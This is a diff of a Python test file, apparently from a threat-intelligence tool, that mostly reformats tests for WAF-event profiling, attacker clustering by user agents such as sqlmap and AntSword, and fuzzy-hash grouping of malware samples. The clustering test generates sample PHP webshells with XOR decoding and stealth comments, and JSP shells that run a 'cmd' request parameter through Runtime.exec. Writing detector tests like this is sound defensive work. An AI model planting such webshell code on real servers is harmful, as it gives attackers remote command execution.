@@ -9,6 +9,7 @@ Covers:
   4. Decay formula 24h/half verification
   5. ssdeep failure → py-tlsh fallback
 """
+
 import json
 from datetime import datetime, timedelta
 
@@ -21,7 +22,7 @@ class TestMockWAFFullChain:
     def test_waf_events_create_profile(self, waf_events_file, threat_graph):
         """Feed WAF events and verify at least one attacker profile is created."""
         graph = threat_graph
-        with open(str(waf_events_file), 'r', encoding='utf-8') as f:
+        with open(str(waf_events_file), "r", encoding="utf-8") as f:
             for line in f:
                 if line.strip():
                     evt = json.loads(line.strip())
@@ -34,7 +35,7 @@ class TestMockWAFFullChain:
         """Multiple events from same UA should aggregate into one profile."""
         graph = threat_graph
         feed_count = 0
-        with open(str(waf_events_file), 'r', encoding='utf-8') as f:
+        with open(str(waf_events_file), "r", encoding="utf-8") as f:
             for line in f:
                 if line.strip():
                     evt = json.loads(line.strip())
@@ -45,19 +46,16 @@ class TestMockWAFFullChain:
 
         profiles = graph.get_active_profiles()
         sqlmap_profiles = [
-            profile
-            for profile in profiles
-            if "sqlmap" in profile.ua_fingerprint.lower()
+            profile for profile in profiles if "sqlmap" in profile.ua_fingerprint.lower()
         ]
         assert any(
-            {"10.99.99.1", "10.99.99.2"}.issubset(profile.ip_pool)
-            for profile in sqlmap_profiles
+            {"10.99.99.1", "10.99.99.2"}.issubset(profile.ip_pool) for profile in sqlmap_profiles
         ), "Same SQLMap fingerprint in one time window must aggregate both IPs"
 
     def test_profile_has_risk_score(self, waf_events_file, threat_graph):
         """Profile should have a risk_score after ingesting events."""
         graph = threat_graph
-        with open(str(waf_events_file), 'r', encoding='utf-8') as f:
+        with open(str(waf_events_file), "r", encoding="utf-8") as f:
             for line in f:
                 if line.strip():
                     evt = json.loads(line.strip())
@@ -95,9 +93,7 @@ class TestProxyPoolClustering:
         graph.merge_overlapping_profiles(min_overlap=3)
 
         profiles = graph.get_active_profiles()
-        antsword_profiles = [
-            p for p in profiles if "antsword" in p.ua_fingerprint
-        ]
+        antsword_profiles = [p for p in profiles if "antsword" in p.ua_fingerprint]
         assert len(antsword_profiles) >= 1, (
             f"Expected at least 1 merged AntSword profile, got {len(antsword_profiles)}"
         )
@@ -126,26 +122,26 @@ class TestFileClustering:
 
         # Common PHP webshell skeleton shared across variants
         common_functions = (
-            '<?php\n'
-            '// WordPress-like bootstrap wrapper for stealth\n'
+            "<?php\n"
+            "// WordPress-like bootstrap wrapper for stealth\n"
             'if (!defined("ABSPATH")) { define("ABSPATH", dirname(__FILE__) . "/"); }\n'
             'function wb_safe_decode($data, $key = "XORKEY") {\n'
             '    $out = "";\n'
-            '    for ($i = 0; $i < strlen($data); $i++) {\n'
-            '        $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));\n'
-            '    }\n'
-            '    return $out;\n'
-            '}\n'
-            'function wb_check_auth($token) {\n'
+            "    for ($i = 0; $i < strlen($data); $i++) {\n"
+            "        $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));\n"
+            "    }\n"
+            "    return $out;\n"
+            "}\n"
+            "function wb_check_auth($token) {\n"
             '    $valid = md5(date("Ymd") . "SECRET_SALT");\n'
-            '    return hash_equals($valid, $token);\n'
-            '}\n'
-            'function wb_get_request($key, $default = null) {\n'
-            '    if (isset($_POST[$key])) return $_POST[$key];\n'
-            '    if (isset($_GET[$key])) return $_GET[$key];\n'
-            '    if (isset($_REQUEST[$key])) return $_REQUEST[$key];\n'
-            '    return $default;\n'
-            '}\n'
+            "    return hash_equals($valid, $token);\n"
+            "}\n"
+            "function wb_get_request($key, $default = null) {\n"
+            "    if (isset($_POST[$key])) return $_POST[$key];\n"
+            "    if (isset($_GET[$key])) return $_GET[$key];\n"
+            "    if (isset($_REQUEST[$key])) return $_REQUEST[$key];\n"
+            "    return $default;\n"
+            "}\n"
         )
 
         templates = [
@@ -164,27 +160,27 @@ class TestFileClustering:
             padding = f"// Red team variant #{i} — deployed across multiple targets\n// Hash: {hash(payload)}\n"
             content = common_functions + payload + "\n" + padding
             # Pad to ensure > 4KB for ppdeep minimum
-            while len(content.encode('utf-8')) < 4500:
+            while len(content.encode("utf-8")) < 4500:
                 content += f"// padding line {len(content)} to reach ppdeep minimum size\n"
-            (sample_dir / f"shell_{i}.php").write_text(content, encoding='utf-8')
+            (sample_dir / f"shell_{i}.php").write_text(content, encoding="utf-8")
 
         # Also create 10 JSP shells as cross-language control group
         jsp_common = (
             '<%@ page import="java.io.*,java.util.*" %>\n'
-            '<%\n'
+            "<%\n"
             'String cmd = request.getParameter("cmd");\n'
-            'if (cmd != null) {\n'
+            "if (cmd != null) {\n"
         )
         for i in range(10):
             jsp_content = jsp_common + (
                 '    Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});\n'
-                if i % 2 == 0 else
-                '    Process p = Runtime.getRuntime().exec(cmd);\n'
+                if i % 2 == 0
+                else "    Process p = Runtime.getRuntime().exec(cmd);\n"
             )
-            jsp_content += '}\n%>\n'
-            while len(jsp_content.encode('utf-8')) < 4500:
+            jsp_content += "}\n%>\n"
+            while len(jsp_content.encode("utf-8")) < 4500:
                 jsp_content += f"// JSP padding line {len(jsp_content)} for ppdeep\n"
-            (sample_dir / f"cmd_{i}.jsp").write_text(jsp_content, encoding='utf-8')
+            (sample_dir / f"cmd_{i}.jsp").write_text(jsp_content, encoding="utf-8")
 
         # Compute all hashes
         hashes = {}
@@ -204,12 +200,12 @@ class TestFileClustering:
         jsp_similarities = []
         php_paths = sorted(hashes.keys())
         for i, path1 in enumerate(php_paths):
-            for path2 in php_paths[i + 1:]:
+            for path2 in php_paths[i + 1 :]:
                 try:
                     sim = ppdeep.compare(hashes[path1], hashes[path2])
-                    if path1.endswith('.php') and path2.endswith('.php'):
+                    if path1.endswith(".php") and path2.endswith(".php"):
                         php_similarities.append(sim)
-                    elif path1.endswith('.jsp') or path2.endswith('.jsp'):
+                    elif path1.endswith(".jsp") or path2.endswith(".jsp"):
                         jsp_similarities.append(sim)
                 except Exception:
                     pass
@@ -324,12 +320,14 @@ class TestHashFallback:
 
         try:
             import ppdeep  # noqa: F401 - optional dependency availability probe
+
             has_ssdeep = True
         except ImportError:
             pass
 
         try:
             import tlsh
+
             has_tlsh = True
         except ImportError:
             pass
